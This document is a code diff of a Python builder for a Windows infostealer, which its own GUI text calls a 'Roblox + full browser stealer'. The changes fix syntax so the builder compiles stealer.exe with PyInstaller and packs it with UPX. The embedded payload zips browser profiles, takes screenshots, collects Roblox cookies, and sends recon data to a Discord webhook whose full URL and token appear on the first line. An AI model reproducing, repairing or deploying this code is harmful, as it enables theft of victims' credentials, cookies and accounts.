@@ -1,9 +1,6 @@
 https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO
 
 
-pip install pyinstaller pycryptodome pywin32 requests pyautogui
-
-
 import os
 import subprocess
 import tkinter as tk
@@ -83,7 +80,7 @@ def get_webhook():
             generate_malware(webhooks, pfx_path, pfx_pass)
             progress.stop()
             progress.pack_forget()
-            messagebox.showinfo("Built", "stealer.exe built clean - fixed hidden imports + guaranteed recon hit.")
+            messagebox.showinfo("Built", "stealer.exe built - syntax fixed + Python 3.14 clean.\nRecon + screen hits webhook every time.")
         except Exception as e:
             progress.stop()
             progress.pack_forget()
@@ -97,19 +94,19 @@ def get_webhook():
     info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
     info_text.pack(padx=10, pady=10)
     info_text.insert(tk.END, textwrap.dedent('''
-    ROBLOX + FULL BROWSER STEALER - DEC 2025 FINAL FIX
-    • Fixed PyInstaller command line mangling (no more status 1)
-    • Always hits webhook with recon.txt + desktop.png
-    • Roblox cookie grab + safe profile zips/screenshots
-    • No Pyarmor dependency
-    • UPX ultra-brute if available
-    Run builder as admin for best results.
+    ROBLOX + FULL BROWSER STEALER - DEC 2025 PYTHON 3.14 FIXED
+    • SyntaxError nuked - proper try/except nesting
+    • No invalid escape warnings
+    • Always sends recon.txt + desktop screenshot
+    • Roblox cookie + raw profile dumps
+    • UPX ultra-brute if you got it
+    Builds clean on latest Python now.
     '''))
     info_text.config(state=tk.DISABLED)
 
     root.mainloop()
 
-# =================== FULL STEALER PAYLOAD (unchanged crash-proof) ===================
+# =================== FULL STEALER PAYLOAD - SYNTAX FIXED ===================
 stealer_code = textwrap.dedent('''
 import os
 import sys
@@ -226,15 +223,17 @@ def safe_dump_profile(browser_name, base_path):
                             z.write(fp, arc)
                         except: continue
             dumped.append(zip_path)
-            if HAS_PYAUTO:
-                for kf in ["Local State", "Login Data", "Network\\Cookies"]:
-                    kp = os.path.join(src, kf)
-                    if os.path.exists(kp):
-                        shot = os.path.join(os.getenv("TEMP"), f"{browser_name}_{prof}_{kf.replace('\\\\', '_')}_shot.png")
-                        try: pyautogui.screenshot(shot)
-                        dumped.append(shot)
-                        except: pass
         except: pass
+
+        if HAS_PYAUTO:
+            for kf in ["Local State", "Login Data", r"Network\\Cookies"]:
+                kp = os.path.join(src, kf)
+                if os.path.exists(kp):
+                    shot = os.path.join(os.getenv("TEMP"), f"{browser_name}_{prof}_{kf.replace('\\\\', '_')}_shot.png")
+                    try:
+                        pyautogui.screenshot(shot)
+                        dumped.append(shot)
+                    except: pass
     return dumped
 
 def exfil(webhooks):
@@ -296,24 +295,20 @@ def exfil(webhooks):
 exfil({WEBHOOK_PLACEHOLDER})
 ''')
 
-# =================== BUILD FUNCTION - FIXED HIDDEN IMPORTS ===================
+# =================== BUILD FUNCTION ===================
 def generate_malware(webhooks, pfx_path="", pfx_pass=None):
     if not shutil.which("pyinstaller"):
-        raise Exception("pyinstaller not found in PATH → open cmd and run: pip install pyinstaller")
+        raise Exception("pyinstaller not found → pip install pyinstaller")
 
     temp_dir = tempfile.mkdtemp(prefix="build_")
     script_path = os.path.join(temp_dir, "main.py")
     with open(script_path, "w", encoding="utf-8") as f:
         f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", repr(webhooks)))
 
-    # Fixed hidden imports - no typos, proper repeats
     hidden = [
-        "requests", "requests.auth", "requests.cookies", "requests.packages", 
-        "requests.packages.urllib3", "requests.packages.chardet",
-        "urllib3", "chardet", "certifi", "idna",
-        "pyautogui", "win32crypt", "pywin32", "win32api", "win32con",
-        "Crypto", "Crypto.Cipher", "Crypto.Cipher.AES", "Crypto.Util.Padding",
-        "pycryptodome", "zipfile", "ssl", "_ssl"
+        "requests", "requests.auth", "requests.cookies", "requests.packages.urllib3", "requests.packages.chardet",
+        "urllib3", "chardet", "certifi", "idna", "pyautogui", "win32crypt", "pywin32",
+        "Crypto", "Crypto.Cipher.AES", "pycryptodome", "zipfile"
     ]
     hidden_args = []
     for mod in hidden:
@@ -341,11 +336,11 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None):
 
     try:
         subprocess.run(["upx", "--best", "--ultra-brute", final_exe], check=False)
-        print("UPX smashed")
+        print("UPX done")
     except: print("UPX skipped")
 
     shutil.rmtree(temp_dir, ignore_errors=True)
-    print(f"Built fixed beast: {final_exe}")
+    print(f"Built: {final_exe}")
 
 if __name__ == "__main__":
     get_webhook()
